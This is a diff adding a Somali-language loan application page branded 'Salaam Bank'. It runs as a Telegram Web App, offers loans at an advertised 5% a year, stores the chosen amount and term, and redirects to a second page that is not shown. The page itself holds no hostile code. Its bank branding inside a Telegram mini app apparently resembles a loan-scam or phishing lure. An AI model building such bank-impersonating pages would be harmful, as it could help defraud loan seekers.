@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html lang="so">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Salaam Bank - Hel Dayntaada Si Deg Deg Ah</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        :root {
+            --bank-primary: #008751;
+            --bank-hover: #006d41;
+            --bg-color: #e5e5e5;
+            --card-bg: #ffffff;
+            --calc-bg: #f8f9fa;
+            --text-main: #000000;
+            --text-muted: #666666;
+            --slider-track: #dcdcdc;
+        }
+        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+        body { background-color: var(--bg-color); margin: 0; padding: 0; display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
+        .app-header { width: 100%; background-color: var(--bank-primary); height: 60px; padding: 0 20px; display: flex; align-items: center; justify-content: space-between; position: sticky; top: 0; z-index: 100; }
+        .header-title { display: flex; align-items: center; font-size: 22px; font-weight: 800; letter-spacing: -0.5px; color: #ffffff; }
+        .header-title .salaam { color: #ffd700; margin-right: 6px; }
+        .card { background: var(--card-bg); width: 90%; max-width: 440px; margin: 20px 0 30px; padding: 30px 24px; border-radius: 16px; box-shadow: 0 4px 20px rgba(0, 0, 0, 0.05); display: flex; flex-direction: column; }
+        .main-title { font-size: 26px; color: var(--text-main); margin: 0 0 12px; text-align: center; font-weight: 800; line-height: 1.25; }
+        .subtext { font-size: 13px; color: var(--text-muted); text-align: center; margin-bottom: 28px; line-height: 1.4; }
+        .calculator-container { background: var(--calc-bg); border-radius: 12px; padding: 22px 18px 18px; margin-bottom: 24px; }
+        .calculator-title { color: var(--text-main); font-weight: 700; font-size: 17px; margin-bottom: 22px; }
+        .slider-section { margin-bottom: 22px; }
+        .slider-header { display: flex; justify-content: space-between; align-items: center; font-size: 14px; color: #444444; font-weight: 600; margin-bottom: 8px; }
+        .accent-text { color: var(--bank-primary); font-weight: 800; font-size: 15px; }
+        input[type=range] { -webkit-appearance: none; width: 100%; margin: 10px 0; background: transparent; }
+        input[type=range]::-webkit-slider-runnable-track { width: 100%; height: 6px; cursor: pointer; background: var(--slider-track); border-radius: 3px; }
+        input[type=range]::-webkit-slider-thumb { height: 22px; width: 22px; border-radius: 50%; background: var(--bank-primary); cursor: pointer; -webkit-appearance: none; margin-top: -8px; box-shadow: 0 2px 5px rgba(0,0,0,0.2); }
+        .slider-footer { display: flex; justify-content: space-between; font-size: 11px; color: #888888; margin-top: 2px; }
+        .result-container { background: #ffffff; border: 1px solid #eeeeee; border-radius: 12px; padding: 16px; display: flex; justify-content: center; align-items: center; gap: 12px; margin-top: 20px; }
+        .result-label { font-size: 15px; color: #333333; font-weight: 500; }
+        .result-amount { color: var(--bank-primary); font-size: 22px; font-weight: 800; }
+        .interest-rate-info { text-align: center; font-size: 11px; color: #777777; margin-top: 12px; }
+        .btn-apply { background: var(--bank-primary); color: white; border: none; width: 100%; padding: 16px; border-radius: 10px; font-size: 15px; font-weight: 800; cursor: pointer; letter-spacing: 0.5px; margin-bottom: 28px; text-transform: uppercase; }
+        .features-list { display: flex; flex-direction: column; gap: 20px; padding-top: 10px; }
+        .feature-item { display: flex; align-items: center; gap: 18px; }
+        .feature-icon-svg { width: 32px; height: 32px; flex-shrink: 0; display: flex; align-items: center; justify-content: center; font-size: 26px; }
+        .feature-title { font-size: 15px; font-weight: 700; color: #000000; }
+        .feature-desc { font-size: 13px; color: #888888; }
+        .footer-banner { width: 100%; text-align: center; padding: 20px; font-size: 12px; color: #666666; margin-top: auto; }
+    </style>
+</head>
+<body>
+<div class="app-header">
+    <div style="width: 24px;"></div>
+    <div class="header-title"><span class="salaam">Salaam</span> Bank</div>
+    <div class="menu-icon" style="color:white; font-size:24px;">☰</div>
+</div>
+
+<div class="card">
+    <h1 class="main-title">Hel Dayntaada<br>Si Deg Deg Ah</h1>
+    <div class="subtext">Ansixin degdeg ah • Faa'iido yar •<br>Shuruudo fudud</div>
+
+    <div class="calculator-container">
+        <div class="calculator-title">Xisaabiyaha Daynta</div>
+        <div class="slider-section">
+            <div class="slider-header">
+                <span>Inta La Eegayo (Lacagta)</span>
+                <span id="valAmt" class="accent-text">$2,500</span>
+            </div>
+            <input type="range" id="amt" min="100" max="20000" step="100" value="2500">
+            <div class="slider-footer"><span>$100</span><span>$20,000</span></div>
+        </div>
+
+        <div class="slider-section">
+            <div class="slider-header">
+                <span>Muddada Bisha</span>
+                <span id="valDur" class="accent-text">12 bilood</span>
+            </div>
+            <input type="range" id="dur" min="3" max="36" step="1" value="12">
+            <div class="slider-footer"><span>3 bilood</span><span>36 bilood</span></div>
+        </div>
+
+        <div class="result-container">
+            <span class="result-label">Bishii</span>
+            <span id="monthly" class="result-amount">$225</span>
+        </div>
+        <div class="interest-rate-info">Qiyaasta Faa'iidada: 5% sanadkii</div>
+    </div>
+
+    <button class="btn-apply" onclick="goToPage2()">DALBO DAYN</button>
+
+    <div class="features-list">
+        <div class="feature-item">
+            <div class="feature-icon-svg">⚡</div>
+            <div class="feature-text"><span class="feature-title">Degdeg</span><span class="feature-desc">Jawaab 24 saac gudahood ah</span></div>
+        </div>
+        <div class="feature-item">
+            <div class="feature-icon-svg">💰</div>
+            <div class="feature-text"><span class="feature-title">Faa'iido Hoose</span><span class="feature-desc">Laga bilaabo 5%</span></div>
+        </div>
+        <div class="feature-item">
+            <div class="feature-icon-svg">🔒</div>
+            <div class="feature-text"><span class="feature-title">Amaan ah</span><span class="feature-desc">Heer bangi</span></div>
+        </div>
+    </div>
+</div>
+
+<div class="footer-banner">© 2026 Salaam Bank Somalia</div>
+
+<script>
+    let calculatedMonthly = 225;
+    function formatUSD(value) { return "$" + value.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ","); }
+    function update() {
+        const amtEl = document.getElementById('amt');
+        const durEl = document.getElementById('dur');
+        if (!amtEl || !durEl) return;
+        const principal = Number(amtEl.value) || 0;
+        const durationMonths = Number(durEl.value) || 1;
+        document.getElementById('valAmt').innerText = formatUSD(principal);
+        document.getElementById('valDur').innerText = `${durationMonths} bilood`;
+        const annualRate = 0.05;
+        const totalInterest = principal * annualRate * (durationMonths / 12);
+        const totalAmount = principal + totalInterest;
+        calculatedMonthly = Math.round(totalAmount / durationMonths);
+        document.getElementById('monthly').innerText = formatUSD(calculatedMonthly);
+    }
+    function goToPage2() {
+        const amtEl = document.getElementById('amt');
+        const durEl = document.getElementById('dur');
+        if (!amtEl || !durEl) return;
+        localStorage.setItem('amount', amtEl.value);
+        localStorage.setItem('loan_amount', amtEl.value);
+        localStorage.setItem('duration', durEl.value);
+        localStorage.setItem('monthly_repayment', calculatedMonthly);
+        window.location.href = "/page2";
+    }
+    window.onload = () => {
+        const tg = window.Telegram?.WebApp;
+        if (tg) { tg.ready(); tg.expand(); }
+        document.getElementById('amt')?.addEventListener('input', update);
+        document.getElementById('dur')?.addEventListener('input', update);
+        update();
+    };
+</script>
+</body>
+</html>
